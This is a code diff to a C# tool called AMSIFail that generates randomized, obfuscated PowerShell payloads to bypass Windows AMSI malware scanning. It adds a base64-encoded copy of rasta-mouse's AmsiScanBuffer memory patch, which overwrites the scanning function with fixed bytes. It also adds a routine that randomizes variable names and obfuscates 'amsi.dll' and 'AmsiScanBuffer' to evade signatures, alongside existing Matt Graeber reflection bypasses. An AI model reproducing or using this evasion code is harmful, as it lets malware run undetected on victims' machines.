@@ -203,6 +203,35 @@ namespace AMSIFail
             return examplePayloads;
 
         }
+
+        public static string encoderasta(string examplePayloads)
+        {
+            var mustEncode = new string[] { "AmsiScanBuffer", "amsi.dll" };
+
+            var varsToEncode = new string[] { "Win32", "LibLoad", "MemAdr", "Patch", "var1", "var2", "var3", "var4", "var5", "var6" };
+
+            //Maybe relevant later on
+            //var patchBytes = new string[] { "B8", "57", "00", "07", "80", "C3" };
+
+            foreach (var word in varsToEncode)
+            {
+                var neword = RandomString(word.Length);
+
+                examplePayloads = examplePayloads.Replace(word, neword);
+            }
+
+            foreach (var word in mustEncode)
+            {
+                string obfuscatedString = ObfuscateString(word);
+
+                obfuscatedString = "$(" + obfuscatedString.TrimStart('+') + ")";
+
+                examplePayloads = examplePayloads.Replace(word, obfuscatedString);
+            }
+
+            return examplePayloads;
+
+        }
         public static string GetPayload()
         {
             //Unknown -Force error
@@ -218,8 +247,11 @@ namespace AMSIFail
             //Using Matt Graebers second Reflection method
             var MattGref02 = "#Matt Graebers second Reflection method \n[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static').GetValue($null),0x" + random.Next(0, int.MaxValue).ToString("X") + ");";
 
+            //Using rasta-mouses AmsiScanBufferBypass from https://github.com/rasta-mouse/AmsiScanBufferBypass/blob/master/ASBBypass.ps1
+            var RastaBuf = Encoding.UTF8.GetString(Convert.FromBase64String("I1Jhc3RhLW1vdXNlcyBBbXNpLVNjYW4tQnVmZmVyIHBhdGNoIFxuDQokV2luMzIgPSBAIg0KdXNpbmcgU3lzdGVtOw0KdXNpbmcgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzOw0KcHVibGljIGNsYXNzIFdpbjMyIHsNCiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMiIpXQ0KICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBHZXRQcm9jQWRkcmVzcyhJbnRQdHIgaE1vZHVsZSwgc3RyaW5nIHByb2NOYW1lKTsNCiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMiIpXQ0KICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBMb2FkTGlicmFyeShzdHJpbmcgbmFtZSk7DQogICAgW0RsbEltcG9ydCgia2VybmVsMzIiKV0NCiAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBib29sIFZpcnR1YWxQcm90ZWN0KEludFB0ciBscEFkZHJlc3MsIFVJbnRQdHIgZHdTaXplLCB1aW50IGZsTmV3UHJvdGVjdCwgb3V0IHVpbnQgbHBmbE9sZFByb3RlY3QpOw0KfQ0KIkANCg0KQWRkLVR5cGUgJFdpbjMyDQoNCiRMaWJMb2FkID0gW1dpbjMyXTo6TG9hZExpYnJhcnkoImFtc2kuZGxsIikNCiRNZW1BZHIgPSBbV2luMzJdOjpHZXRQcm9jQWRkcmVzcygkTGliTG9hZCwgIkFtc2lTY2FuQnVmZmVyIikNCiRwID0gMA0KW1dpbjMyXTo6VmlydHVhbFByb3RlY3QoJE1lbUFkciwgW3VpbnQzMl01LCAweDQwLCBbcmVmXSRwKQ0KJHZhcjEgPSAiMHhCOCINCiR2YXIyID0gIjB4NTciDQokdmFyMyA9ICIweDAwIg0KJHZhcjQgPSAiMHgwNyINCiR2YXI1ID0gIjB4ODAiDQokdmFyNiA9ICIweEMzIg0KJFBhdGNoID0gW0J5dGVbXV0gKCR2YXIxLCR2YXIyLCR2YXIzLCR2YXI0LCskdmFyNSwrJHZhcjYpDQpbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpDb3B5KCRQYXRjaCwgMCwgJE1lbUFkciwgNik="));
+
             //Select a random method
-            switch (RandomNumber(1, 5))
+            switch (RandomNumber(1, 6))
             {
                 case 1:
                     return encodePayload(MattGRefl);
@@ -229,6 +261,8 @@ namespace AMSIFail
                     return encodePayload(MattGref02);
                 case 4:
                     return encodePayload(ForceErrer, true);
+                case 5:
+                    return encoderasta(RastaBuf);
                 default:
                     return encodePayload(MattGRefl);
             }
